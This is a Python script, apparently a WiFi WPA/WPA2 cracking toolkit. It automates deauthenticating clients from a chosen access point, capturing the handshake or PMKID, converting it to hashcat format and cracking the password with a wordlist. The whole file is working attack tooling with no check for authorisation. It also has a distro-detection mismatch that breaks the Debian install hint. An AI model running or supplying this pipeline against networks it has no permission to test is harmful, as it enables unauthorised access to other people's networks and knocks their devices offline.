#!/usr/bin/env python3
"""
8cracker - WiFi WPA/WPA2 handshake cracking toolkit (Python front-end).

A single, distro-portable Python CLI that wires together the standard
open-source tooling:

  * airodump-ng   - capture the WPA handshake / PMKID
  * aireplay-ng   - deauthentication to force a handshake
  * hcxpcapngtool - convert the capture to hashcat's -m 22000 format
  * hashcat       - crack the hash via its OpenCL backend (GPU-agnostic:
                    works on any OpenCL-capable device: AMD, NVIDIA, Intel)

The heavy lifting stays on those well-tested C tools; this script only drives
the pipeline (subprocess) and adds distro-aware dependency handling so it runs
on Arch, Debian/Ubuntu, Fedora, openSUSE, Alpine, etc. without editing scripts.

Subcommands:
  capture        Capture a handshake/PMKID to captured_packet-01.cap
  extract        Convert the capture to hash/captured_packet.hc22000
  crack          Crack hash/captured_packet.hc22000 with a wordlist (OpenCL)
  show           Show already-cracked passwords from the potfile
  install-deps   Print (or run) the distro-specific install command

All working files (capture, hash, potfile) are stored under
~/.cache/8cracker (override with CRACKER_DIR) so the tool locates them
regardless of the current directory it is launched from.
"""

import argparse
import os
import shutil
import signal
import subprocess
import sys
import time

# All working files live under a fixed, per-user cache directory so the tool
# works no matter where it is launched from (e.g. after a system-wide install).
# Override with the CRACKER_DIR environment variable if desired.
def _work_dir():
    base = os.environ.get("CRACKER_DIR")
    if not base:
        base = os.environ.get("XDG_CACHE_HOME") or os.path.join(os.path.expanduser("~"), ".cache")
    d = os.path.join(base, "8cracker")
    os.makedirs(d, exist_ok=True)
    return d


WORK_DIR = _work_dir()
CAPTURE_BASE = os.path.join(WORK_DIR, "captured_packet")
CAPTURE_CAP = f"{CAPTURE_BASE}-01.cap"
HASH_DIR = os.path.join(WORK_DIR, "hash")
HASH_FILE = os.path.join(HASH_DIR, "captured_packet.hc22000")
POTFILE = os.path.join(HASH_DIR, "captured_packet.potfile")
DEFAULT_WORDLIST = "rockyou.txt"

# Distro -> package manager + dependency package names.
DEP_PACKAGES = {
    "pacman": ["intel-compute-runtime", "ocl-icd", "hashcat", "hcxtools", "aircrack-ng"],
    "apt": ["intel-opencl-icd", "ocl-icd-libopencl1", "hashcat", "hcxtools", "aircrack-ng"],
    "dnf": ["intel-compute-runtime", "ocl-icd", "hashcat", "hcxtools", "aircrack-ng"],
    "zypper": ["intel-compute-runtime", "ocl-icd", "hashcat", "hcxtools", "aircrack-ng"],
    "apk": ["opencl-intel", "opencl", "hashcat", "hcxtools", "aircrack-ng"],
}


def detect_distro():
    """Return the package manager command for the running distro, or None."""
    for pm in ("pacman", "apt-get", "dnf", "zypper", "apk"):
        if shutil.which(pm):
            return pm
    return None


def install_command(pm):
    if pm == "pacman":
        return f"sudo pacman -S {' '.join(DEP_PACKAGES['pacman'])}"
    if pm == "apt":
        return f"sudo apt-get update && sudo apt-get install -y {' '.join(DEP_PACKAGES['apt'])}"
    if pm == "dnf":
        return f"sudo dnf install -y {' '.join(DEP_PACKAGES['dnf'])}"
    if pm == "zypper":
        return f"sudo zypper install -y {' '.join(DEP_PACKAGES['zypper'])}"
    if pm == "apk":
        return f"sudo apk add {' '.join(DEP_PACKAGES['apk'])}"
    return None


def require(*tools):
    """Abort with a helpful message if any required tool is missing."""
    missing = [t for t in tools if shutil.which(t) is None]
    if missing:
        pm = detect_distro()
        print(f"[-] Missing required tool(s): {', '.join(missing)}")
        cmd = install_command(pm) if pm else None
        if cmd:
            print(f"[?] Install them with: {cmd}")
        else:
            print("[?] Could not detect your distro's package manager. "
                  "Install: aircrack-ng, hcxtools, hashcat, ocl-icd, and an OpenCL runtime.")
        sys.exit(1)


def run(args, check=True):
    print(f"[*] $ {' '.join(args)}")
    return subprocess.run(args, check=check)


def cmd_capture(args):
    require("airmon-ng", "airodump-ng", "aireplay-ng")
    if os.geteuid() != 0:
        print("[-] Capture needs root. Re-run with sudo.")
        sys.exit(1)

    iface = args.interface
    run(["airmon-ng", "check", "kill"])

    print("[+] Starting a scan. Note the target BSSID and Channel.")
    scan = subprocess.Popen(["airodump-ng", iface])
    input("[+] Press Enter to stop scanning and continue...")
    scan.send_signal(signal.SIGINT)
    scan.wait()

    bssid = input("[?] Enter the target BSSID (MAC): ").strip()
    channel = input("[?] Enter the target Channel: ").strip()
    if not bssid or not channel:
        print("[-] BSSID and Channel are required.")
        sys.exit(1)

    print(f"[+] Capturing handshake for {bssid} on channel {channel}...")
    cap = subprocess.Popen(
        ["airodump-ng", "--bssid", bssid, "-c", channel, "-w", CAPTURE_BASE, iface]
    )
    time.sleep(3)
    print("[+] Sending deauthentication packets to force a handshake...")
    run(["aireplay-ng", "-0", "7", "-a", bssid, iface], check=False)

    try:
        cap.wait()
    except KeyboardInterrupt:
        cap.send_signal(signal.SIGINT)
        cap.wait()

    if os.path.exists(CAPTURE_CAP):
        print(f"[+] Capture saved to {CAPTURE_CAP}. Now run: extract")
    else:
        print("[-] Capture file not found. A handshake may not have been captured.")


def cmd_extract(args):
    require("hcxpcapngtool")
    if not os.path.exists(CAPTURE_CAP):
        print(f"[-] {CAPTURE_CAP} not found. Run 'capture' first.")
        sys.exit(1)
    os.makedirs(HASH_DIR, exist_ok=True)
    run(["hcxpcapngtool", "-o", HASH_FILE, CAPTURE_CAP])
    if os.path.exists(HASH_FILE) and os.path.getsize(HASH_FILE) > 0:
        print(f"[+] Hash extracted to {HASH_FILE}")
        print("[+] Preview:")
        print(open(HASH_FILE, "r", encoding="utf-8", errors="replace").read())
    else:
        print("[-] Extraction failed. Ensure a full handshake or PMKID was captured.")


def cmd_crack(args):
    require("hashcat")
    if not os.path.exists(HASH_FILE):
        print(f"[-] {HASH_FILE} not found. Run 'extract' first.")
        sys.exit(1)
    wordlist = args.wordlist
    if not os.path.exists(wordlist):
        print(f"[-] Wordlist {wordlist} not found.")
        print(f"[?] Generate one with: gen-wordlist --chars ... --output {wordlist}")
        sys.exit(1)
    # -m 22000 = WPA-PBKDF2-PMKID+EAPOL, -a 0 = dictionary, OpenCL backend.
    run(["hashcat", "-m", "22000", "-a", "0",
         "--potfile-path", POTFILE, HASH_FILE, wordlist])
    print("[+] Done. Show results with: show")


def cmd_show(args):
    require("hashcat")
    if not os.path.exists(HASH_FILE):
        print(f"[-] {HASH_FILE} not found. Run 'extract' first.")
        sys.exit(1)
    run(["hashcat", "-m", "22000", "--show", "--potfile-path", POTFILE, HASH_FILE],
        check=False)


def cmd_install_deps(args):
    pm = detect_distro()
    if pm is None:
        print("[-] Could not detect a supported package manager.")
        print("    Install manually: aircrack-ng, hcxtools, hashcat, ocl-icd, OpenCL runtime.")
        return
    cmd = install_command(pm)
    print(f"[+] Detected package manager: {pm}")
    print(f"[+] To install dependencies:\n    {cmd}")
    if args.yes:
        subprocess.run(cmd, shell=True, check=False)


def build_parser():
    p = argparse.ArgumentParser(description="WiFi WPA/WPA2 cracking toolkit (OpenCL)")
    sub = p.add_subparsers(dest="command", required=True)

    c = sub.add_parser("capture", help="Capture handshake to captured_packet-01.cap")
    c.add_argument("--interface", default="wlan1mon", help="Monitor-mode interface")
    c.set_defaults(func=cmd_capture)

    sub.add_parser("extract", help="Convert capture to hash/captured_packet.hc22000").set_defaults(func=cmd_extract)

    k = sub.add_parser("crack", help="Crack the hash with a wordlist (OpenCL)")
    k.add_argument("--wordlist", default=DEFAULT_WORDLIST)
    k.set_defaults(func=cmd_crack)

    sub.add_parser("show", help="Show cracked passwords").set_defaults(func=cmd_show)

    i = sub.add_parser("install-deps", help="Print/run distro install command")
    i.add_argument("--yes", action="store_true", help="Actually run the install")
    i.set_defaults(func=cmd_install_deps)

    return p


def main():
    args = build_parser().parse_args()
    args.func(args)


if __name__ == "__main__":
    main()
